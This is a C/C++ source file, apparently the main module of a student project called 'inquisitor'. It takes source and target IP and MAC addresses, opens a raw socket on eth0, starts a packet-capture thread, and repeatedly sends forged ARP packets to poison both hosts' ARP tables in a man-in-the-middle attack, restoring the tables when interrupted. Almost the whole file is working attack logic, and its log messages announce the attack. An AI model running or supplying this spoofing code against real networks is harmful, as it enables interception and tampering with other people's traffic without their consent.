#include "../inc/inquisitor.h"

void init_inqui(t_inquisitor *inquisitor, char **av) {
  inquisitor->ip_src = (int8_t *) av[1];
  inquisitor->mac_src = (int8_t *) av[2];
  inquisitor->ip_target = (int8_t *) av[3];
  inquisitor->mac_target = (int8_t *) av[4];
  inquisitor->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (inquisitor->sock == -1)
    error("socket", nullptr, __FILE__, __LINE__, __func__);
  inquisitor->ifr.ifr_addr.sa_family = AF_INET;
  strncpy(inquisitor->ifr.ifr_name, "eth0", strlen("eth0") + 1);
  int retval = ioctl(inquisitor->sock, SIOCGIFADDR, &inquisitor->ifr);
  if (retval == -1)
    error("ioctl", nullptr, __FILE__, __LINE__, __func__);
  inquisitor->index = if_nametoindex("eth0");
  if (!inquisitor->index)
    error("if_nametoindex", nullptr, __FILE__, __LINE__, __func__);
  retval = ioctl(inquisitor->sock, SIOCGIFHWADDR, &inquisitor->ifr);
  if (retval == -1)
    error("ioctl", nullptr, __FILE__, __LINE__, __func__);
  mac_str_to_hex(inquisitor->mac_src, (uint8_t *) inquisitor->mac_src_byte_arr);
  mac_str_to_hex(inquisitor->mac_target, (uint8_t *) inquisitor->mac_target_byte_arr);
}

void handler_sigint(int sig) {
  if (sig == SIGINT) {
    dprintf(1, YELLOW "WARNING: SIGINT received, aborting the attack...\n" RESET);
    pcap_breakloop(g_handler);
    status_loop = false;
  }
}

int main(int ac, char **av) {
  t_inquisitor inquisitor;

  if (ac != 5 && ac != 6)
    error("Usage", "sudo ./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target> -v(if needed)", nullptr, 0, nullptr);
  if (ac == 6) {
    verbose = true;
    av[5] = nullptr;
  }
  signal(SIGINT, handler_sigint);
  init_inqui(&inquisitor, av);
  std::thread spoofer(capture_packet, &inquisitor);
  dprintf(1, GREEN "LOG: Starting attack...\n" RESET);
  while (status_loop) {
    send_fake_arp_packet(&inquisitor, 1); // alter target arp tables
    send_fake_arp_packet(&inquisitor, 2); // alter source arp tables
    sleep(1);
  }
  spoofer.join();
  restore_arp_tables(&inquisitor, 1);
  restore_arp_tables(&inquisitor, 2);
  close(inquisitor.sock);
}
